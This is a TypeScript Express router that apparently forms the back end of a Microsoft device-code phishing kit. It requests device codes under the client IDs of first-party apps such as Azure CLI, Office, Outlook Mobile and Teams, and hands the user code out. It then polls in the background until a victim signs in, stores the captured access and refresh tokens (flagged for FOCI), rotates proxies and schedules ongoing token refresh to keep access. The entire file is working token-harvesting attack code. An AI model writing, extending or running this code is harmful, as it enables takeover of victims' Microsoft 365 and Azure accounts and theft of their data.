import { Router, type IRouter } from "express";
import { eq, desc } from "drizzle-orm";
import { db } from "@workspace/db";
import {
  deviceCodesTable,
  activeAccessTokensTable,
  activeRefreshTokensTable,
} from "@workspace/db";
import { checkRateLimit, workerAuthHeader } from "../lib/rateLimiter";
import { requestDeviceCode, pollForToken } from "../lib/msAuthClient";
import type { ProxyConfig } from "../lib/proxyRotator";
import { getActiveAlias } from "../lib/configLoader";
import { extractUserFromJwt } from "../lib/jwtUtils";
import { scheduleTokenRefresh } from "../lib/tokenRefresher";
import { logger } from "../lib/logger";
import { encryptConfigValue } from "@workspace/db/secure-config";
import { recordFailure, recordMetric } from "../lib/metrics";

const router: IRouter = Router();

export const CLIENT_ALIAS_MAP: Record<
  string,
  { id: string; name: string; resource: string }
> = {
  "azure-cli": {
    id: "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    name: "Azure CLI",
    resource: "https://graph.microsoft.com",
  },
  "azure-powershell": {
    id: "1950a258-227b-4e31-a9cf-717495945fc2",
    name: "Azure PowerShell",
    resource: "https://graph.microsoft.com",
  },
  msgraph: {
    id: "14d82eec-204b-4c2f-b7e8-296a70dab67e",
    name: "Microsoft Graph PowerShell",
    resource: "https://graph.microsoft.com",
  },
  office365: {
    id: "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    name: "Microsoft Office",
    resource: "https://manage.office.com",
  },
  exchange: {
    id: "27922004-5251-4030-b22d-91ecd9a37ea4",
    name: "Outlook Mobile",
    resource: "https://outlook.office365.com",
  },
  sharepoint: {
    id: "9bc3ab49-b65d-410a-85ad-de819febfddc",
    name: "SharePoint Online Management Shell",
    resource: "https://sharepoint.com",
  },
  msteams: {
    id: "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    name: "Microsoft Teams",
    resource: "https://api.spaces.skype.com",
  },
};

function resolveAlias(
  alias: string,
): { id: string; name: string; resource: string } | null {
  return CLIENT_ALIAS_MAP[alias.toLowerCase()] ?? null;
}

const trustedProxyIps = new Set(
  (process.env["TRUSTED_PROXY_IPS"] ?? "")
    .split(",")
    .map((ip) => ip.trim())
    .filter(Boolean),
);

export function getClientIp(req: import("express").Request): string {
  const peerIp = req.socket.remoteAddress ?? "unknown";
  if (!trustedProxyIps.has(peerIp)) return peerIp;

  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    const forwardedIp = (Array.isArray(forwarded) ? forwarded[0] : forwarded)
      .split(",")[0]
      .trim();
    if (forwardedIp) return forwardedIp;
  }
  return peerIp;
}

async function issueCode(
  clientId: string,
  alias: string,
  resource: string,
): Promise<{
  user_code: string;
  device_code: string;
  expires_at: Date;
  resource: string;
  proxy: ProxyConfig | null;
}> {
  const { data: apiResponse, proxy } = await requestDeviceCode(clientId, resource);
  const now = new Date();
  const expiresAt = new Date(now.getTime() + 900_000);

  await db
    .insert(deviceCodesTable)
    .values({
      userCode: apiResponse.user_code,
      generatedAt: now,
      expiresAt,
      clientId: alias,
      status: "POLLING",
    })
    .onConflictDoUpdate({
      target: deviceCodesTable.userCode,
      set: {
        generatedAt: now,
        expiresAt,
        clientId: alias,
        status: "POLLING",
        lastPolledAt: null,
      },
    });

  return {
    user_code: apiResponse.user_code,
    device_code: apiResponse.device_code,
    expires_at: expiresAt,
    resource,
    proxy,
  };
}

router.get("/generatecode", async (req, res): Promise<void> => {
  const alias = (
    (req.query.app as string) ?? getActiveAlias() ?? "azure-cli"
  ).toLowerCase();
  const client = resolveAlias(alias);

  if (!client) {
    res.status(400).json({
      error: `Unknown app alias "${alias}". Valid aliases: ${Object.keys(CLIENT_ALIAS_MAP).join(", ")}`,
    });
    return;
  }

  const ip = getClientIp(req);
  const { allowed, resetAt } = await checkRateLimit(ip, "generatecode", req.header(workerAuthHeader));

  if (!allowed) {
    res.status(429).json({
      error: "Rate limit exceeded. Try again tomorrow.",
      reset_at: resetAt.toISOString(),
    });
    return;
  }

  req.log.info({ ip, alias, app: client.name }, "Generating device code");

  let issued: Awaited<ReturnType<typeof issueCode>>;
  try {
    issued = await issueCode(client.id, alias, client.resource);
  } catch (err) {
    req.log.error({ err }, "Failed to call Microsoft API 1");
    recordFailure("device_code_generation_failures_total", { operation: "generate" });
    res.status(502).json({ error: "Failed to contact Microsoft auth service" });
    return;
  }

  res.json({
    user_code: issued.user_code,
    expires_at: issued.expires_at.toISOString(),
    expires_in: 900,
    app: client.name,
  });
  recordMetric("device_code_generation_success_total");

  startPolling(issued.device_code, issued.user_code, client.id, alias, issued.resource, issued.proxy);
});

router.post("/regeneratecode", async (req, res): Promise<void> => {
  const ip = getClientIp(req);
  const alias = (
    (req.body?.app as string) ?? getActiveAlias() ?? "azure-cli"
  ).toLowerCase();
  const client = resolveAlias(alias);

  if (!client) {
    res.status(400).json({
      error: `Unknown app alias "${alias}". Valid aliases: ${Object.keys(CLIENT_ALIAS_MAP).join(", ")}`,
    });
    return;
  }

  const [existing] = await db
    .select()
    .from(deviceCodesTable)
    .where(eq(deviceCodesTable.clientId, alias))
    .orderBy(desc(deviceCodesTable.generatedAt))
    .limit(1);

  if (existing && existing.status === "POLLING" && existing.expiresAt > new Date()) {
    const secondsLeft = Math.ceil(
      (existing.expiresAt.getTime() - Date.now()) / 1000,
    );
    res.status(409).json({
      error: "An active code is still valid. Wait for it to expire first.",
      user_code: existing.userCode,
      expires_in: secondsLeft,
      expires_at: existing.expiresAt.toISOString(),
    });
    return;
  }

  const { allowed, resetAt } = await checkRateLimit(ip, "regeneratecode", req.header(workerAuthHeader));

  if (!allowed) {
    res.status(429).json({
      error: "Rate limit exceeded. Try again tomorrow.",
      reset_at: resetAt.toISOString(),
    });
    return;
  }

  req.log.info({ ip, alias, app: client.name }, "Regenerating device code");

  let issued: Awaited<ReturnType<typeof issueCode>>;
  try {
    issued = await issueCode(client.id, alias, client.resource);
  } catch (err) {
    req.log.error({ err }, "Failed to call Microsoft API 1 on regenerate");
    recordFailure("device_code_generation_failures_total", { operation: "regenerate" });
    res.status(502).json({ error: "Failed to contact Microsoft auth service" });
    return;
  }

  res.json({
    user_code: issued.user_code,
    expires_at: issued.expires_at.toISOString(),
    expires_in: 900,
    app: client.name,
  });

  startPolling(issued.device_code, issued.user_code, client.id, alias, issued.resource, issued.proxy);
});

router.get("/apps", (_req, res): void => {
  const apps = Object.entries(CLIENT_ALIAS_MAP).map(([alias, { name }]) => ({
    alias,
    name,
  }));
  res.json({ apps });
});

function startPolling(
  deviceCode: string,
  userCode: string,
  clientId: string,
  alias: string,
  resource: string,
  proxy: ProxyConfig | null,
): void {
  pollForToken(
    clientId,
    deviceCode,
    resource,
    proxy,
    900_000,
    async (pollTimestamp: Date) => {
      await db
        .update(deviceCodesTable)
        .set({ lastPolledAt: pollTimestamp })
        .where(eq(deviceCodesTable.userCode, userCode));
    },
  )
    .then(async (token) => {
      if (!token) {
        await db
          .update(deviceCodesTable)
          .set({ status: "EXPIRED" })
          .where(eq(deviceCodesTable.userCode, userCode));
        logger.info({ userCode, alias }, "Device code expired without success");
        return;
      }

      await db
        .update(deviceCodesTable)
        .set({ status: "SUCCESS" })
        .where(eq(deviceCodesTable.userCode, userCode));

      const issuedAt = new Date();
      const expiresAt = new Date(
        issuedAt.getTime() + (token.expires_in ?? 3600) * 1000,
      );

      const userAccount = extractUserFromJwt(token.id_token ?? token.access_token);
      const tokenResource = token.resource ?? resource;

      await db.insert(activeAccessTokensTable).values({
        issued: issuedAt,
        expires: expiresAt,
        user: userAccount,
        scopes: token.scope ?? "",
        accessToken: encryptConfigValue(token.access_token),
        resource: tokenResource,
        clientId: alias,
      });

      const [rtRow] = await db.insert(activeRefreshTokensTable).values({
        storedAt: issuedAt,
        user: userAccount,
        resource: tokenResource,
        clientId: alias,
        foci: token.id_token ? "1" : null,
        refreshToken: token.refresh_token
          ? encryptConfigValue(token.refresh_token)
          : null,
        lastRefreshedAt: issuedAt,
        nextRefreshAt: new Date(expiresAt.getTime() - 5 * 60 * 1000),
      }).returning();

      logger.info({ userCode, alias, user: userAccount }, "Token stored successfully");

      if (rtRow?.id && token.refresh_token) {
        scheduleTokenRefresh(rtRow.id, clientId, alias, tokenResource, expiresAt);
      }
    })
    .catch((err) => {
      logger.error({ err, userCode }, "Polling encountered an unhandled error");
    });
}

export default router;
